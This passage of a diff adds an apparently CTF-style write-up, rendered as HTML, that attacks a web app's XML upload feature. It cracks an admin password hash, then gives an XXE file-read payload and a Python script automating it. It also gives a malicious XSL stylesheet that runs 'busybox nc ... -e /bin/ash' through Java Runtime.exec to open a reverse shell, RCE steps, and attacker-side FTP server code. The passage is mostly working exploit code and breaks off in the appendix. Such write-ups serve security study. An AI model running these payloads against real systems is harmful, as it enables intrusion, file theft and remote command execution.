+<span style="color:#000;font-weight:bold">INSERT</span> <span style="color:#000;font-weight:bold">INTO</span> <span style="color:#000;font-weight:bold">`</span>users<span style="color:#000;font-weight:bold">`</span> <span style="color:#000;font-weight:bold">VALUES</span> (<span style="color:#099">4</span>,<span style="color:#d14">&#34;ftasuku&#34;</span>, <span style="color:#d14">&#34;8372A22D15B3EB9BBA0785582A4AE9F89CA40ED6BDE17DFA7A3843418C65FAA12B4FC668EC3294587252187A7EE90F94C6AD7F3E41C480A9799F4F1FEBD06F90&#34;</span>,<span style="color:#d14">&#34;user&#34;</span>);
+
+<span style="color:#000;font-weight:bold">INSERT</span> <span style="color:#000;font-weight:bold">INTO</span> <span style="color:#000;font-weight:bold">`</span>users<span style="color:#000;font-weight:bold">`</span> <span style="color:#000;font-weight:bold">VALUES</span> (<span style="color:#099">5</span>,<span style="color:#d14">&#34;admin&#34;</span>, <span style="color:#d14">&#34;291C55BD5F735359196614F3FD76A5A862D6E3FC8E0B33C03FB87C3A9FAF00DA62DBBBE02DA78315872CB52C279B68D9F28763672269BC67A19213FE81215347&#34;</span>,<span style="color:#d14">&#34;admin&#34;</span>);
+
+<span style="color:#000;font-weight:bold">INSERT</span> <span style="color:#000;font-weight:bold">INTO</span> <span style="color:#000;font-weight:bold">`</span>users<span style="color:#000;font-weight:bold">`</span> <span style="color:#000;font-weight:bold">VALUES</span> (<span style="color:#099">6</span>,<span style="color:#d14">&#34;nodakyuichi&#34;</span>,<span style="color:#d14">&#34;09E44A336BF05D22B739D19D7214B5D4D018D6917AA3100E77F1A08D958FC1C5E650AC49653C95171E610E6B3B6923505742B6899A3C3B344BE421BB4F2BD4AE&#34;</span>,<span style="color:#d14">&#34;user&#34;</span>); 
+</code></pre></td></tr></table>
+</div>
+</div><p>Using <a href="https://crackstation.net/">CrackStation</a> we recover the plaintext of the admin&rsquo;s hash: <code>admin: admin123456</code></p>
+<p>We can read files using basic XXE payload:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-xml" data-lang="xml"><span style="color:#999;font-weight:bold;font-style:italic">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#999;font-weight:bold;font-style:italic">&lt;!DOCTYPE X [ &lt;!ENTITY x SYSTEM &#34;file:///.&#34;&gt;</span> ]&gt;
+<span style="color:#000080">&lt;book</span> <span style="color:#008080">xml:id=</span><span style="color:#d14">&#34;simple_book&#34;</span> <span style="color:#008080">xmlns=</span><span style="color:#d14">&#34;http://docbook.org/ns/docbook&#34;</span> <span style="color:#008080">version=</span><span style="color:#d14">&#34;5.0&#34;</span><span style="color:#000080">&gt;</span>
+    <span style="color:#000080">&lt;title&gt;</span>XXE<span style="color:#000080">&lt;/title&gt;</span>
+    <span style="color:#000080">&lt;chapter</span> <span style="color:#008080">xml:id=</span><span style="color:#d14">&#34;chapter_1&#34;</span><span style="color:#000080">&gt;</span>
+        <span style="color:#000080">&lt;title&gt;</span>BASIC<span style="color:#000080">&lt;/title&gt;</span>
+        <span style="color:#000080">&lt;para&gt;</span><span style="color:#800080">&amp;x;</span><span style="color:#000080">&lt;/para&gt;</span>
+    <span style="color:#000080">&lt;/chapter&gt;</span>
+<span style="color:#000080">&lt;/book&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Automate</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-python" data-lang="python"><span style="color:#998;font-style:italic">#!/usr/bin/env python3</span>
+
+<span style="color:#000;font-weight:bold">import</span> <span style="color:#555">sys</span>
+<span style="color:#000;font-weight:bold">import</span> <span style="color:#555">requests</span>
+
+proxies <span style="color:#000;font-weight:bold">=</span> {
+  <span style="color:#d14">&#34;http&#34;</span>:  <span style="color:#d14">&#34;http://127.0.0.1:8080&#34;</span>,
+  <span style="color:#d14">&#34;https&#34;</span>: <span style="color:#d14">&#34;http://127.0.0.1:8080&#34;</span>,
+}
+
+<span style="color:#000;font-weight:bold">assert</span>(<span style="color:#0086b3">len</span>(sys<span style="color:#000;font-weight:bold">.</span>argv) <span style="color:#000;font-weight:bold">==</span> <span style="color:#099">2</span>)
+
+session <span style="color:#000;font-weight:bold">=</span> requests<span style="color:#000;font-weight:bold">.</span>Session()
+cookies <span style="color:#000;font-weight:bold">=</span> {<span style="color:#d14">&#34;JSESSIONID&#34;</span>:<span style="color:#d14">&#34;56F1A5A28BCC7A47392DE880E84D3919&#34;</span>}
+
+scheme <span style="color:#000;font-weight:bold">=</span> <span style="color:#d14">&#34;file://&#34;</span>
+<span style="color:#0086b3">file</span> <span style="color:#000;font-weight:bold">=</span> sys<span style="color:#000;font-weight:bold">.</span>argv[<span style="color:#099">1</span>]
+<span style="color:#000;font-weight:bold">if</span> <span style="color:#d14">&#34;://&#34;</span> <span style="color:#000;font-weight:bold">in</span> sys<span style="color:#000;font-weight:bold">.</span>argv[<span style="color:#099">1</span>]:
+    scheme, <span style="color:#0086b3">file</span> <span style="color:#000;font-weight:bold">=</span> sys<span style="color:#000;font-weight:bold">.</span>argv[<span style="color:#099">1</span>]<span style="color:#000;font-weight:bold">.</span>split(<span style="color:#d14">&#34;://&#34;</span>)
+    scheme <span style="color:#000;font-weight:bold">+=</span> <span style="color:#d14">&#34;://&#34;</span>
+
+paramsPost <span style="color:#000;font-weight:bold">=</span> {<span style="color:#d14">&#34;template&#34;</span>:<span style="color:#d14">&#34;doc_book_preview.xsl&#34;</span>,<span style="color:#d14">&#34;action&#34;</span>:<span style="color:#d14">&#34;test&#34;</span>,<span style="color:#d14">&#34;_csrf&#34;</span>:<span style="color:#d14">&#34;681573ff-eb26-477e-abb1-00a52ec45b2f&#34;</span>,<span style="color:#d14">&#34;xmlCode&#34;</span>:f<span style="color:#d14">&#34;&lt;?xml version=</span><span style="color:#d14">\&#34;</span><span style="color:#d14">1.0</span><span style="color:#d14">\&#34;</span><span style="color:#d14"> encoding=</span><span style="color:#d14">\&#34;</span><span style="color:#d14">UTF-8</span><span style="color:#d14">\&#34;</span><span style="color:#d14">?&gt;</span><span style="color:#d14">\r\n</span><span style="color:#d14">&lt;!DOCTYPE book [ &lt;!ENTITY x SYSTEM </span><span style="color:#d14">\&#34;</span><span style="color:#d14">{scheme}{file}</span><span style="color:#d14">\&#34;</span><span style="color:#d14">&gt; ]&gt;</span><span style="color:#d14">\r\n</span><span style="color:#d14">&lt;book xml:id=</span><span style="color:#d14">\&#34;</span><span style="color:#d14">simple_book</span><span style="color:#d14">\&#34;</span><span style="color:#d14"> xmlns=</span><span style="color:#d14">\&#34;</span><span style="color:#d14">http://docbook.org/ns/docbook</span><span style="color:#d14">\&#34;</span><span style="color:#d14"> version=</span><span style="color:#d14">\&#34;</span><span style="color:#d14">5.0</span><span style="color:#d14">\&#34;</span><span style="color:#d14">&gt;</span><span style="color:#d14">\r\n</span><span style="color:#d14">    &lt;title&gt;XXE&lt;/title&gt;</span><span style="color:#d14">\r\n</span><span style="color:#d14">    &lt;chapter xml:id=</span><span style="color:#d14">\&#34;</span><span style="color:#d14">chapter_1</span><span style="color:#d14">\&#34;</span><span style="color:#d14">&gt;</span><span style="color:#d14">\r\n</span><span style="color:#d14">        &lt;title&gt;&amp;x;&lt;/title&gt;</span><span style="color:#d14">\r\n</span><span style="color:#d14">        &lt;para&gt;1&lt;/para&gt;</span><span style="color:#d14">\r\n</span><span style="color:#d14">    &lt;/chapter&gt;</span><span style="color:#d14">\r\n</span><span style="color:#d14">&lt;/book&gt;&#34;</span>,<span style="color:#d14">&#34;title&#34;</span>:<span style="color:#d14">&#34;New Book&#34;</span>}
+headers <span style="color:#000;font-weight:bold">=</span> {<span style="color:#d14">&#34;Origin&#34;</span>:<span style="color:#d14">&#34;http://127.0.0.1:8024&#34;</span>,<span style="color:#d14">&#34;Accept&#34;</span>:<span style="color:#d14">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span>,<span style="color:#d14">&#34;Upgrade-Insecure-Requests&#34;</span>:<span style="color:#d14">&#34;1&#34;</span>,<span style="color:#d14">&#34;User-Agent&#34;</span>:<span style="color:#d14">&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0&#34;</span>,<span style="color:#d14">&#34;Referer&#34;</span>:<span style="color:#d14">&#34;http://127.0.0.1:8024/admin/upload&#34;</span>,<span style="color:#d14">&#34;Connection&#34;</span>:<span style="color:#d14">&#34;close&#34;</span>,<span style="color:#d14">&#34;Sec-GPC&#34;</span>:<span style="color:#d14">&#34;1&#34;</span>,<span style="color:#d14">&#34;Accept-Encoding&#34;</span>:<span style="color:#d14">&#34;gzip, deflate&#34;</span>,<span style="color:#d14">&#34;DNT&#34;</span>:<span style="color:#d14">&#34;1&#34;</span>,<span style="color:#d14">&#34;Accept-Language&#34;</span>:<span style="color:#d14">&#34;en-US,en;q=0.5&#34;</span>,<span style="color:#d14">&#34;Content-Type&#34;</span>:<span style="color:#d14">&#34;application/x-www-form-urlencoded&#34;</span>}
+response <span style="color:#000;font-weight:bold">=</span> session<span style="color:#000;font-weight:bold">.</span>post(<span style="color:#d14">&#34;http://127.0.0.1:8024/admin/upload&#34;</span>, data<span style="color:#000;font-weight:bold">=</span>paramsPost, headers<span style="color:#000;font-weight:bold">=</span>headers, cookies<span style="color:#000;font-weight:bold">=</span>cookies, proxies<span style="color:#000;font-weight:bold">=</span>proxies)
+
+<span style="color:#000;font-weight:bold">print</span>(f<span style="color:#d14">&#34;Status code: {response.status_code}&#34;</span>)
+
+ix_start <span style="color:#000;font-weight:bold">=</span> response<span style="color:#000;font-weight:bold">.</span>content<span style="color:#000;font-weight:bold">.</span>find(<span style="color:#d14">b</span><span style="color:#d14">&#34;XXE&#34;</span>) <span style="color:#000;font-weight:bold">+</span> <span style="color:#0086b3">len</span>(<span style="color:#d14">&#34;XXE&lt;/h4&gt;&lt;h6&gt;&#34;</span>)
+ix_end <span style="color:#000;font-weight:bold">=</span> response<span style="color:#000;font-weight:bold">.</span>content<span style="color:#000;font-weight:bold">.</span>find(<span style="color:#d14">b</span><span style="color:#d14">&#34;&lt;p&gt;&#34;</span>) <span style="color:#000;font-weight:bold">-</span> <span style="color:#0086b3">len</span>(<span style="color:#d14">&#34;&lt;/h6&gt;&#34;</span>)
+
+<span style="color:#000;font-weight:bold">print</span>(response<span style="color:#000;font-weight:bold">.</span>content[ix_start:ix_end]<span style="color:#000;font-weight:bold">.</span>decode(<span style="color:#d14">&#39;ascii&#39;</span>))
+</code></pre></td></tr></table>
+</div>
+</div><p>Gain command execution (=&gt; spawn a reverse shell)</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-xml" data-lang="xml"><span style="color:#000080">&lt;xsl:stylesheet</span> <span style="color:#008080">version=</span><span style="color:#d14">&#34;1.0&#34;</span>
+    <span style="color:#008080">xmlns:xsl=</span><span style="color:#d14">&#34;http://www.w3.org/1999/XSL/Transform&#34;</span>
+    <span style="color:#008080">xmlns:date=</span><span style="color:#d14">&#34;http://xml.apache.org/xalan/java/java.util.Date&#34;</span>
+    <span style="color:#008080">xmlns:rt=</span><span style="color:#d14">&#34;http://xml.apache.org/xalan/java/java.lang.Runtime&#34;</span>
+    <span style="color:#008080">xmlns:str=</span><span style="color:#d14">&#34;http://xml.apache.org/xalan/java/java.lang.String&#34;</span>
+    <span style="color:#008080">exclude-result-prefixes=</span><span style="color:#d14">&#34;date&#34;</span><span style="color:#000080">&gt;</span>
+
+  <span style="color:#000080">&lt;xsl:output</span> <span style="color:#008080">method=</span><span style="color:#d14">&#34;text&#34;</span><span style="color:#000080">/&gt;</span>
+  <span style="color:#000080">&lt;xsl:template</span> <span style="color:#008080">match=</span><span style="color:#d14">&#34;/&#34;</span><span style="color:#000080">&gt;</span>
+
+   <span style="color:#000080">&lt;xsl:variable</span> <span style="color:#008080">name=</span><span style="color:#d14">&#34;cmd&#34;</span><span style="color:#000080">&gt;</span><span style="color:#999;font-weight:bold;font-style:italic">&lt;![CDATA[busybox nc 172.22.0.1 1312 -e /bin/ash]]&gt;</span><span style="color:#000080">&lt;/xsl:variable&gt;</span>
+   <span style="color:#000080">&lt;xsl:variable</span> <span style="color:#008080">name=</span><span style="color:#d14">&#34;rtObj&#34;</span> <span style="color:#008080">select=</span><span style="color:#d14">&#34;rt:getRuntime()&#34;</span><span style="color:#000080">/&gt;</span>
+   <span style="color:#000080">&lt;xsl:variable</span> <span style="color:#008080">name=</span><span style="color:#d14">&#34;process&#34;</span> <span style="color:#008080">select=</span><span style="color:#d14">&#34;rt:exec($rtObj, $cmd)&#34;</span><span style="color:#000080">/&gt;</span>
+   <span style="color:#000080">&lt;xsl:text&gt;</span>Process: <span style="color:#000080">&lt;/xsl:text&gt;&lt;xsl:value-of</span> <span style="color:#008080">select=</span><span style="color:#d14">&#34;$process&#34;</span><span style="color:#000080">/&gt;</span>
+
+  <span style="color:#000080">&lt;/xsl:template&gt;</span>
+<span style="color:#000080">&lt;/xsl:stylesheet&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Steps:</p>
+<ol>
+<li>Create the above <code>malicious.xsl</code> file</li>
+<li>Start the <code>slow_http_server.py</code> in the same directory ==&gt;  <code>python3 ./slow_http_server.py</code></li>
+<li>Use <code>jar:</code> pseudo-protocol to download the <code>malicious.xsl</code> file in the <code>/temp/</code> directory ==&gt; <code>python3 ./xxe-xpl.py 'jar:http://172.20.0.1:9999/!/a'</code></li>
+<li>Identify the name of the temporary file created in <code>/tmp/</code> ==&gt; <code>python3 ./xxe-xpl.py /tmp/</code></li>
+<li>Use directory traversal vulnerability in <code>template</code> parameter to invoke the <code>java.lang.Runtime.exec</code> method and achieve RCE.</li>
+</ol>
+<hr>
+<h3 id="appendix">Appendix</h3>
+<p><strong>ftp_server.rb</strong></p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-ruby" data-lang="ruby"><span style="color:#0086b3">require</span> <span style="color:#d14">&#39;socket&#39;</span>
+
+ftp_server <span style="color:#000;font-weight:bold">=</span> <span style="color:#008080">TCPServer</span><span style="color:#000;font-weight:bold">.</span>new <span style="color:#099">21</span>
+
+log <span style="color:#000;font-weight:bold">=</span> <span style="color:#008080">File</span><span style="color:#000;font-weight:bold">.</span>open( <span style="color:#d14">&#34;xxe-ftp.log&#34;</span>, <span style="color:#d14">&#34;a&#34;</span>)
+
+<span style="color:#008080">Thread</span><span style="color:#000;font-weight:bold">.</span>start <span style="color:#000;font-weight:bold">do</span>
+<span style="color:#000;font-weight:bold">loop</span> <span style="color:#000;font-weight:bold">do</span>
+  <span style="color:#008080">Thread</span><span style="color:#000;font-weight:bold">.</span>start(ftp_server<span style="color:#000;font-weight:bold">.</span>accept) <span style="color:#000;font-weight:bold">do</span> <span style="color:#000;font-weight:bold">|</span>ftp_client<span style="color:#000;font-weight:bold">|</span>
+    <span style="color:#0086b3">puts</span> <span style="color:#d14">&#34;FTP. New client connected&#34;</span>
+    ftp_client<span style="color:#000;font-weight:bold">.</span>puts(<span style="color:#d14">&#34;220 xxe-ftp-server&#34;</span>)
+    <span style="color:#000;font-weight:bold">loop</span> {
+        req <span style="color:#000;font-weight:bold">=</span> ftp_client<span style="color:#000;font-weight:bold">.</span>gets()
+        <span style="color:#000;font-weight:bold">break</span> <span style="color:#000;font-weight:bold">if</span> req<span style="color:#000;font-weight:bold">.</span>nil?
+        <span style="color:#0086b3">puts</span> <span style="color:#d14">&#34;&lt; &#34;</span><span style="color:#000;font-weight:bold">+</span>req
+        log<span style="color:#000;font-weight:bold">.</span>write <span style="color:#d14">&#34;get req: </span><span style="color:#d14">#{</span>req<span style="color:#000;font-weight:bold">.</span>inspect<span style="color:#d14">}</span><span style="color:#d14">\n</span><span style="color:#d14">&#34;</span>
+
+        <span style="color:#000;font-weight:bold">if</span> req<span style="color:#000;font-weight:bold">.</span>include? <span style="color:#d14">&#34;LIST&#34;</span>
+            ftp_client<span style="color:#000;font-weight:bold">.</span>puts(<span style="color:#d14">&#34;drwxrwxrwx 1 owner group          1 Feb 21 04:37 test&#34;</span>)
+            ftp_client<span style="color:#000;font-weight:bold">.</span>puts(<span style="color:#d14">&#34;150 Opening BINARY mode data connection for /bin/ls&#34;</span>)
+            ftp_client<span style="color:#000;font-weight:bold">.</span>puts(<span style="color:#d14">&#34;226 Transfer complete.&#34;</span>)
+        <span style="color:#000;font-weight:bold">elsif</span> req<span style="color:#000;font-weight:bold">.</span>include? <span style="color:#d14">&#34;USER&#34;</span>
+            ftp_client<span style="color:#000;font-weight:bold">.</span>puts(<span style="color:#d14">&#34;331 password please - version check&#34;</span>)
+        <span style="color:#000;font-weight:bold">elsif</span> req<span style="color:#000;font-weight:bold">.</span>include? <span style="color:#d14">&#34;PORT&#34;</span>
+            <span style="color:#0086b3">puts</span> <span style="color:#d14">&#34;! PORT received&#34;</span>
+            <span style="color:#998;font-style:italic"># puts &#34;&gt; 200 PORT command ok&#34;</span>
+            ftp_client<span style="color:#000;font-weight:bold">.</span>puts(<span style="color:#d14">&#34;200 PORT command ok&#34;</span>)
+        <span style="color:#000;font-weight:bold">else</span>
+            <span style="color:#998;font-style:italic"># puts &#34;&gt; 230 more data please!&#34;</span>
+            ftp_client<span style="color:#000;font-weight:bold">.</span>puts(<span style="color:#d14">&#34;230 more data please!&#34;</span>)
+        <span style="color:#000;font-weight:bold">end</span>
+    }
+    <span style="color:#0086b3">puts</span> <span style="color:#d14">&#34;FTP. Connection closed&#34;</span>
+  <span style="color:#000;font-weight:bold">end</span>
+<span style="color:#000;font-weight:bold">end</span>
+<span style="color:#000;font-weight:bold">end</span>
+
+<span style="color:#000;font-weight:bold">loop</span> <span style="color:#000;font-weight:bold">do</span>
+    <span style="color:#0086b3">sleep</span>(<span style="color:#099">1000</span>)
+<span style="color:#000;font-weight:bold">end</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>slow_http_server.py</strong></p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
